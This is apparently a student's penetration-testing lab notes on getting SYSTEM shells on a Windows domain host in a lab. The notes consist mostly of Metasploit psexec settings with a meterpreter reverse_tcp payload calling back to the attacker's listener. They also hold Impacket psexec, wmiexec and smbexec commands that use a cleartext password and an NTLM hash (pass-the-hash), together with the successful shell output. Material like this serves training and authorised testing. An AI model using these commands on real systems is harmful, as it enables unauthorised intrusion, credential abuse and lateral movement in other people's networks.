
## Gaining Shell Access

#impacket-psexec
#psexec 
#metasploit/psexec
1. Metasploit psexec
2. Instead of utilizing password or account, we can utilize hash instead
3. metasploit is noisy , we can use psexec.py instead(similar to metasploit and cant be seen) -> `impacket-psexec`

## Lab Time
- Start `msfexploit`
- `search psexec`
- `use 4` - exploit/windows/smb/psexec
- `set payload windows/x64/meterpreter/reverse_tcp`
- `set RHOSTS 192.168.64.220`
- `set smbdomain MARVEL.local`
- `set smbuser fcastle`
- `set smbpass P@$$w0rd1`
- Show targets if automatic not working you can choose other
- Execute run


> Use 4 
```
msf6 > search psexec

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------

   4   exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution


Interact with a module by name or index. For example info 10, use 10 or use exploit/windows/local/wmi

msf6 > use 4
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp                                                       
msf6 exploit(windows/smb/psexec) >                                       
```


======

> You see here that the payload is not x64, you need to setup the payload to x64

```
msf6 exploit(windows/smb/psexec) > options                                                                                     
Module options (exploit/windows/smb/psexec):                          

   Name                  Current Setting  Required  Description                                                                
   ----                  ---------------  --------  -----------                                                                
   RHOSTS                                 yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit  
                                                    /basics/using-metasploit.html                                              
   RPORT                 445              yes       The SMB service port (TCP)                                                 
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing                
   SERVICE_DISPLAY_NAME                   no        The service display name                                                   
   SERVICE_NAME                           no        The service name                                                           
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a norma
                                                    l read/write folder share
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.64.4     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.


```

> Sometimes the automatic target not working, you can freely chaneg it to other if the automatic is not working
```
msf6 exploit(windows/smb/psexec) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Automatic
    1   PowerShell
    2   Native upload
    3   MOF upload
    4   Command

```

> Here is the final setting
```
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                192.168.64.220   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                                    /basics/using-metasploit.html
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             MARVEL.local     no        The Windows domain to use for authentication
   SMBPass               P@$$w0rd1        no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a norma
                                                    l read/write folder share
   SMBUser               fcastle          no        The username to authenticate as


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.64.4     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```


Running the exploit. You can interchange from background to session 1
- `background` to go back to msf6 exploit (window/smb/psexec)
- `sessions`
- `session 1` - to go back to meterpreter

```
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 192.168.64.4:4444 
[*] 192.168.64.220:445 - Connecting to the server...
[*] 192.168.64.220:445 - Authenticating to 192.168.64.220:445|MARVEL.local as user 'fcastle'...
[*] 192.168.64.220:445 - Selecting PowerShell target
[*] 192.168.64.220:445 - Executing the payload...
[+] 192.168.64.220:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (200774 bytes) to 192.168.64.220
[*] Meterpreter session 1 opened (192.168.64.4:4444 -> 192.168.64.220:49721) at 2024-07-14 20:29:38 -0700

meterpreter > 
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ PUNISHER  192.168.64.4:4444 -> 192.168.64.220:49721 (192.168.64.22
                                                                     0)

msf6 exploit(windows/smb/psexec) > sessions 1
[*] Starting interaction with 1...

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) > options

```

- WE can use the administrator with password hash to login just change the options

#administratorhashpsexec 

- Previous OPTIONS

```
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                192.168.64.220   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                                    /basics/using-metasploit.html
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             MARVEL.local     no        The Windows domain to use for authentication
   SMBPass               P@$$w0rd1        no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a norma
                                                    l read/write folder share
   SMBUser               fcastle          no        The username to authenticate as


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.64.4     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

```

- Now change it to Administrator
#metasploitadminhashsetup

- `set smbuser Administrator`
- `unset domain`
- `set smb smbpass aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33
- `run`

```
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 192.168.64.4:4444 
[*] 192.168.64.220:445 - Connecting to the server...
[*] 192.168.64.220:445 - Authenticating to 192.168.64.220:445 as user 'Administrator'...
[*] 192.168.64.220:445 - Selecting PowerShell target
[*] 192.168.64.220:445 - Executing the payload...
[+] 192.168.64.220:445 - Service start timed out, OK if running a command or non-service executable...
[*] Exploit completed, but no session was created.

```

## Running psexec manually

#impacket-psexecmanually
#psexecmanually

1. Using fcaste

```
┌──(kali㉿kali)-[~]
└─$ impacket-psexec MARVEL/fcastle:'P@$$w0rd1'@192.168.64.220
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.64.220.....
[*] Found writable share ADMIN$
[*] Uploading file VgetlBZO.exe
[*] Opening SVCManager on 192.168.64.220.....
[*] Creating service PPJt on 192.168.64.220.....
[*] Starting service PPJt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.264]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami 
nt authority\system

```

2. Using the Administrator 
`impacket-psexec administrator@192.168.64.220 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33`

```
┌──(kali㉿kali)-[~]
└─$ impacket-psexec administrator@192.168.64.220 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.64.220.....
[*] Found writable share ADMIN$
[*] Uploading file BRJNrnqP.exe
[*] Opening SVCManager on 192.168.64.220.....
[*] Creating service tFPG on 192.168.64.220.....
[*] Starting service tFPG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.264]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```


## Using wmiexec and smbexec as an option to psexec
#wmiexec


1. Alternatively, you can use wmiexec and smbexec to gain nt authotity access

 - Using wmiexec
`impacket-wmiexec administrator@192.168.64.220 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33`
```
impacket-wmiexec administrator@192.168.64.220 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
punisher\administrator

```


- Using smbexec
`impacket-smbexec administrator@192.168.64.220 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33`

```
impacket-smbexec administrator@192.168.64.220 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>exit

```